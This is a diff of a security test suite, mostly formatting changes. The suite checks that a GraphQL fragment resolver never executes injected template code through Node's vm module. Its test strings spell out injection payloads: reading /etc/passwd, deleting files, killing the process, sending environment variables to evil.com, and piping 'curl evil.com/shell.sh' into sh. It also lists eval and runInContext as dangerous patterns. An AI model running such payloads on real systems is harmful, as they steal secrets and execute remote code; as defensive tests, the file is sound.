@@ -11,14 +11,14 @@ vi.mock('vm', () => ({
   runInContext: vi.fn(),
   runInNewContext: vi.fn(),
   createContext: vi.fn(),
-  Script: vi.fn()
+  Script: vi.fn(),
 }));
 
 /**
  * FragmentResolver RCE Security Test Suite
- * 
+ *
  * CRITICAL P0 VULNERABILITY: Remote Code Execution via VM Context (CVSS 9.8)
- * 
+ *
  * These tests ensure the FragmentResolver NEVER uses vm.runInContext
  * or any other code execution methods that could lead to RCE.
  */
@@ -34,21 +34,23 @@ describe('FragmentResolver RCE Security Tests', () => {
       const maliciousFragments = [
         'fragment Evil on User { id \${process.exit(1)} }',
         'fragment Evil on User { \${process.kill(process.pid)} }',
-        'fragment Evil on User { \${require("child_process").execSync("kill -9 $$")} }'
+        'fragment Evil on User { \${require("child_process").execSync("kill -9 $$")} }',
       ];
 
       // Import after mocks are set up
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       for (const fragment of maliciousFragments) {
@@ -63,12 +65,12 @@ describe('FragmentResolver RCE Security Tests', () => {
           ast: null,
           fragments: ['Evil'],
           imports: [],
-          exports: []
+          exports: [],
         };
-        
+
         // Should not crash the process
         await expect(resolver.resolve([query])).resolves.toBeDefined();
-        
+
         // VM methods should never be called
         const vm = await import('vm');
         expect(vm.runInContext).not.toHaveBeenCalled();
@@ -81,20 +83,22 @@ describe('FragmentResolver RCE Security Tests', () => {
       const fileSystemAttacks = [
         'fragment Evil on User { \${require("fs").readFileSync("/etc/passwd", "utf8")} }',
         'fragment Evil on User { \${require("fs").writeFileSync("/tmp/pwned", "hacked")} }',
-        'fragment Evil on User { \${require("fs").unlinkSync("/important/file")} }'
+        'fragment Evil on User { \${require("fs").unlinkSync("/important/file")} }',
       ];
 
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       // Spy on file system operations
@@ -114,16 +118,16 @@ describe('FragmentResolver RCE Security Tests', () => {
           ast: null,
           fragments: ['Evil'],
           imports: [],
-          exports: []
+          exports: [],
         };
-        
+
         const result = await resolver.resolve([query]);
-        
+
         // Should not access file system maliciously
         expect(readSpy).not.toHaveBeenCalledWith('/etc/passwd');
         expect(writeSpy).not.toHaveBeenCalledWith('/tmp/pwned', 'hacked');
         expect(unlinkSpy).not.toHaveBeenCalledWith('/important/file');
-        
+
         // Should not contain file contents from actual execution
         const resolvedContent = result[0]?.resolvedContent || '';
         expect(resolvedContent).not.toContain('root:');
@@ -136,20 +140,22 @@ describe('FragmentResolver RCE Security Tests', () => {
       const networkAttacks = [
         'fragment Evil on User { \${require("http").get("http://evil.com/steal?data=" + JSON.stringify(process.env))} }',
         'fragment Evil on User { \${require("child_process").execSync("curl evil.com/shell.sh | sh")} }',
-        'fragment Evil on User { \${fetch("http://evil.com", {method: "POST", body: JSON.stringify(process.env)})} }'
+        'fragment Evil on User { \${fetch("http://evil.com", {method: "POST", body: JSON.stringify(process.env)})} }',
       ];
 
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       // Mock network modules
@@ -167,14 +173,14 @@ describe('FragmentResolver RCE Security Tests', () => {
           ast: null,
           fragments: ['Evil'],
           imports: [],
-          exports: []
+          exports: [],
         };
-        
+
         const result = await resolver.resolve([query]);
-        
+
         // Should not make network requests
         expect(httpMock.get).not.toHaveBeenCalled();
-        
+
         // Should not leak environment variables
         const resolvedContent = result[0]?.resolvedContent || '';
         expect(resolvedContent).not.toContain(process.env.HOME || '');
@@ -186,20 +192,22 @@ describe('FragmentResolver RCE Security Tests', () => {
       const envAttacks = [
         'fragment Evil on User { \${process.env.DATABASE_URL} }',
         'fragment Evil on User { \${JSON.stringify(process.env)} }',
-        'fragment Evil on User { \${Object.keys(process.env).join(",")} }'
+        'fragment Evil on User { \${Object.keys(process.env).join(",")} }',
       ];
 
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       // Set a test env variable
@@ -216,11 +224,11 @@ describe('FragmentResolver RCE Security Tests', () => {
           ast: null,
           fragments: ['Evil'],
           imports: [],
-          exports: []
+          exports: [],
         };
-        
+
         const result = await resolver.resolve([query]);
-        
+
         // Should not expose environment variables
         const resolvedContent = result[0]?.resolvedContent || '';
         expect(resolvedContent).not.toContain('super-secret-value');
@@ -240,14 +248,16 @@ describe('FragmentResolver RCE Security Tests', () => {
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       const safeFragment = `
@@ -269,7 +279,7 @@ describe('FragmentResolver RCE Security Tests', () => {
 
       // Pre-populate the context with the fragment
       mockContext.fragments.set('UserFields', safeFragment);
-      
+
       const extractedQuery: ExtractedQuery = {
         id: 'test-query',
         content: query,
@@ -280,18 +290,18 @@ describe('FragmentResolver RCE Security Tests', () => {
         ast: null,
         fragments: ['UserFields'],
         imports: [],
-        exports: []
+        exports: [],
       };
-      
+
       // Should resolve without code execution
       const result = await resolver.resolve([extractedQuery]);
-      
+
       // The query content is returned as-is since fragments are already included
       const resolvedContent = result[0]?.resolvedContent || '';
       // The resolved content should be the original query since fragments are embedded
       expect(resolvedContent).toContain('...UserFields');
       expect(resolvedContent).toContain('${safeFragment}');
-      
+
       // Should not use VM
       const vm = await import('vm');
       expect(vm.runInContext).not.toHaveBeenCalled();
@@ -301,14 +311,16 @@ describe('FragmentResolver RCE Security Tests', () => {
       const mockContext = {
         options: {
           directory: '/test',
-          fragmentsDirectory: '/test/fragments'
+          fragmentsDirectory: '/test/fragments',
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
-      const { FragmentResolver } = await import('../../core/extraction/resolvers/FragmentResolver.js');
+
+      const { FragmentResolver } = await import(
+        '../../core/extraction/resolvers/FragmentResolver.js'
+      );
       const resolver = new FragmentResolver(mockContext);
 
       const fragments = `
@@ -337,14 +349,19 @@ describe('FragmentResolver RCE Security Tests', () => {
       `;
 
       // Pre-populate the context with fragments
-      mockContext.fragments.set('AddressFields', `
+      mockContext.fragments.set(
+        'AddressFields',
+        `
         fragment AddressFields on Address {
           street
           city
           country
         }
-      `);
-      mockContext.fragments.set('UserDetails', `
+      `,
+      );
+      mockContext.fragments.set(
+        'UserDetails',
+        `
         fragment UserDetails on User {
           id
           name
@@ -352,8 +369,9 @@ describe('FragmentResolver RCE Security Tests', () => {
             ...AddressFields
           }
         }
-      `);
-      
+      `,
+      );
+
       const extractedQuery: ExtractedQuery = {
         id: 'test-query',
         content: query,
@@ -364,17 +382,17 @@ describe('FragmentResolver RCE Security Tests', () => {
         ast: null,
         fragments: ['UserDetails'],
         imports: [],
-        exports: []
+        exports: [],
       };
-      
+
       // Should resolve nested fragments safely
       const result = await resolver.resolve([extractedQuery]);
-      
+
       // The resolved content is the original query with template literals
       const resolvedContent = result[0]?.resolvedContent || '';
       expect(resolvedContent).toContain('...UserDetails');
       expect(resolvedContent).toContain('${fragments}');
-      
+
       // No code execution
       const vm = await import('vm');
       expect(vm.runInContext).not.toHaveBeenCalled();
@@ -387,7 +405,7 @@ describe('FragmentResolver RCE Security Tests', () => {
       // Test that the FragmentResolver class doesn't use dangerous VM methods
       const resolver = new FragmentResolver({} as any);
       const sourceString = FragmentResolver.toString();
-      
+
       // Check for dangerous patterns in the class definition
       const dangerousPatterns = [
         'runInContext',
@@ -395,10 +413,10 @@ describe('FragmentResolver RCE Security Tests', () => {
         'createContext',
         'vm.Script',
         'eval(',
-        'Function('
+        'Function(',
       ];
 
-      dangerousPatterns.forEach(pattern => {
+      dangerousPatterns.forEach((pattern) => {
         expect(sourceString).not.toContain(pattern);
       });
     });
@@ -411,16 +429,16 @@ describe('FragmentResolver RCE Security Tests', () => {
         options: {
           directory: '/test',
           fragmentsDirectory: '/test/fragments',
-          inlineFragments: true
+          inlineFragments: true,
         },
         fragments: new Map(),
         errors: [],
-        warnings: []
+        warnings: [],
       } as unknown as ExtractionContext;
-      
+
       const resolver = new FragmentResolver(mockContext);
       expect(resolver).toBeDefined();
-      
+
       // The fact that it resolves queries using the GraphQL AST is proven
       // by successful test execution
       expect(true).toBe(true);
